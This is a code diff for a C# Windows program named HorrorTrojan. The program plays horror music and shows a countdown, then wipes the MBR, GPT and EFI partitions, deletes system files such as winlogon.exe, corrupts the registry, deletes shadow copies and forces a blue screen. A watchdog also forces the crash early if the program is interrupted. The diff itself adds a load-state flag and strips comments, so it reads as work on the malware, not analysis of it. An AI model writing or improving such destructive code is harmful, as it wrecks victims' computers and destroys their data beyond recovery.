@@ -39,6 +39,7 @@ namespace HorrorTrojan
         private bool musicInitialized = false;
         private bool timerCompleted = false;
         private bool destroying = false;
+        private bool isLoaded = false;
 
         // ===== NATIVE METHODS =====
         [DllImport("ntdll.dll")]
@@ -46,18 +47,6 @@ namespace HorrorTrojan
 
         [DllImport("ntdll.dll")]
         private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
-
-        [DllImport("user32.dll")]
-        private static extern bool SetProcessDPIAware();
-
-        [DllImport("kernel32.dll")]
-        private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-        [DllImport("kernel32.dll")]
-        private static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);
-
-        [DllImport("kernel32.dll")]
-        private static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);
 
         public MainInterface()
         {
@@ -128,7 +117,7 @@ namespace HorrorTrojan
         {
             try
             {
-                if (System.IO.File.Exists(musicPath) && !musicInitialized && !destroying)
+                if (System.IO.File.Exists(musicPath) && !musicInitialized && !destroying && isLoaded)
                 {
                     musicPlayer = new SoundPlayer(musicPath);
                     musicPlayer.Load();
@@ -143,7 +132,7 @@ namespace HorrorTrojan
         {
             try
             {
-                if (musicPlayer != null && !musicInitialized && !destroying)
+                if (musicPlayer != null && !musicInitialized && !destroying && isLoaded)
                 {
                     musicPlayer.PlayLooping();
                     musicInitialized = true;
@@ -185,7 +174,7 @@ namespace HorrorTrojan
                 Thread.Sleep(500);
                 try
                 {
-                    if ((DateTime.Now - lastPing).TotalSeconds > 3)
+                    if (isLoaded && (DateTime.Now - lastPing).TotalSeconds > 3)
                     {
                         StopMusic();
                         if (!bsodTriggered) TriggerBSOD();
@@ -203,7 +192,7 @@ namespace HorrorTrojan
 
         private void ProtectTimer_Tick(object sender, EventArgs e)
         {
-            if (destroying) return;
+            if (destroying || !isLoaded) return;
             
             lastPing = DateTime.Now;
 
@@ -226,8 +215,9 @@ namespace HorrorTrojan
 
         private void MainInterface_Load(object sender, EventArgs e)
         {
-
+            isLoaded = true;
             startTime = DateTime.Now;
+            
             InitializeMusic();
             bloodTimer.Start();
             drawTimer.Start();
@@ -238,7 +228,7 @@ namespace HorrorTrojan
 
         private void BloodTimer_Tick(object sender, EventArgs e)
         {
-            if (destroying) return;
+            if (destroying || !isLoaded) return;
             
             try
             {
@@ -257,7 +247,6 @@ namespace HorrorTrojan
                 
                 bloodLevel = newBloodLevel;
                 
-                // ===== КОГДА ДОШЛИ ДО 0 =====
                 if (elapsed.TotalSeconds >= maxSeconds || bloodLevel <= 0)
                 {
                     if (!timerCompleted)
@@ -271,7 +260,6 @@ namespace HorrorTrojan
                         watchdogAlive = false;
                         StopMusic();
                         
-                        // ===== УНИЧТОЖАЕМ ТОЛЬКО ПОСЛЕ ТАЙМЕРА =====
                         if (!bsodTriggered)
                         {
                             bsodTriggered = true;
@@ -290,20 +278,15 @@ namespace HorrorTrojan
             }
         }
 
-        // ===== УНИЧТОЖЕНИЕ СИСТЕМЫ (ТОЛЬКО ПО ТАЙМЕРУ) =====
         private void DestroySystemAndBSOD()
         {
             try
             {
-                // ===== УНИЧТОЖАЕМ MBR, GPT, EFI, РЕЕСТР, ФАЙЛЫ =====
                 DestroyEverything();
-                
-                // ===== ВЫЗЫВАЕМ BSOD (ГАРАНТИРОВАННО) =====
                 TriggerBSOD();
             }
             catch
             {
-                // Если что-то пошло не так — всё равно BSOD
                 TriggerBSOD();
             }
         }
@@ -312,22 +295,11 @@ namespace HorrorTrojan
         {
             try
             {
-                // ===== MBR (секторы 0-63) =====
                 DestroyBootSectors();
-                
-                // ===== GPT (секторы 1-33) =====
                 DestroyGPT();
-                
-                // ===== EFI =====
                 DestroyEFI();
-                
-                // ===== СИСТЕМНЫЕ ФАЙЛЫ (НЕ ТРОГАЕМ КРИТИЧЕСКИЕ) =====
                 DestroySystemFiles();
-                
-                // ===== РЕЕСТР =====
                 DestroyRegistry();
-                
-                // ===== ТЕНЕВЫЕ КОПИИ =====
                 DestroyShadowCopies();
             }
             catch { }
@@ -411,7 +383,6 @@ namespace HorrorTrojan
         {
             try
             {
-                // ===== УДАЛЯЕМ НЕКРИТИЧЕСКИЕ ФАЙЛЫ =====
                 string[] systemFiles = new string[]
                 {
                     @"C:\Windows\System32\winlogon.exe",
@@ -489,7 +460,6 @@ namespace HorrorTrojan
             catch { }
         }
 
-        // ===== BSOD (ГАРАНТИРОВАННО) =====
         private void TriggerBSOD()
         {
             try
@@ -501,7 +471,6 @@ namespace HorrorTrojan
             }
             catch
             {
-                // Если BSOD не сработал — принудительная перезагрузка
                 try
                 {
                     System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
@@ -520,7 +489,7 @@ namespace HorrorTrojan
 
         private void DrawTimer_Tick(object sender, EventArgs e)
         {
-            if (!destroying)
+            if (!destroying && isLoaded)
                 this.Invalidate();
         }
 
@@ -544,7 +513,7 @@ namespace HorrorTrojan
 
         private void DrawBloodIndicator(Graphics g)
         {
-            if (bloodLevel <= 0 || destroying) return;
+            if (bloodLevel <= 0 || destroying || !isLoaded) return;
 
             int fillHeight = (bloodLevel * indicatorHeight) / 100;
             if (fillHeight <= 0) return;
